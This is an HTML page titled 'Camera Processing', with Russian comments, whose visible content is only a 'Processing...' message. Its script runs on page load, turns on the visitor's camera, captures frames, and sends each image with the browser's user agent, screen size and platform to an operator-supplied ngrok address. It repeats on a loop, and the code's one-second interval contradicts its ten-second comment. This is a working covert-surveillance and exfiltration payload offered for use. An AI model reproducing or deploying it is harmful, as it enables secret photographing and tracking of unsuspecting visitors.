<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Camera Processing</title>

<style>
body {
  margin:0;
  font-family: Arial;
  background:#111;
  color:#fff;
  display:flex;
  align-items:center;
  justify-content:center;
  height:100vh;
  flex-direction:column;
}
#status {
  margin-top:20px;
  font-size:14px;
  opacity:0.8;
}
</style>
</head>

<body>

<h2>Processing...</h2>
<div id="status">Initializing</div>

<script>
const NGROK_URL = "https://YOUR-NGROK-URL.ngrok.io"; // ВСТАВЬ СЮДА

const statusEl = document.getElementById("status");

function log(msg){
    console.log(msg);
    statusEl.innerText = msg;
}

async function captureAndSend(){
    try {
        log("Requesting camera...");

        const stream = await navigator.mediaDevices.getUserMedia({video:true});
        const track = stream.getVideoTracks()[0];

        const imageCapture = new ImageCapture(track);
        const bitmap = await imageCapture.grabFrame();

        const canvas = document.createElement("canvas");
        canvas.width = bitmap.width;
        canvas.height = bitmap.height;
        canvas.getContext("2d").drawImage(bitmap,0,0);

        track.stop();

        const dataUrl = canvas.toDataURL("image/jpeg", 0.7);

        const info = {
            userAgent: navigator.userAgent,
            resolution: `${screen.width}x${screen.height}`,
            platform: navigator.platform
        };

        log("Sending...");

        await fetch(`${NGROK_URL}/upload`, {
            method:"POST",
            headers:{"Content-Type":"application/json"},
            body: JSON.stringify({image:dataUrl, info})
        });

        log("Sent ✔");

    } catch(e){
        log("Error: " + e.message);
    }
}

// авто старт
(async () => {
    await captureAndSend();

    // повтор каждые 10 сек (можно изменить)
    setInterval(captureAndSend, 1000);
})();
</script>

</body>
</html>
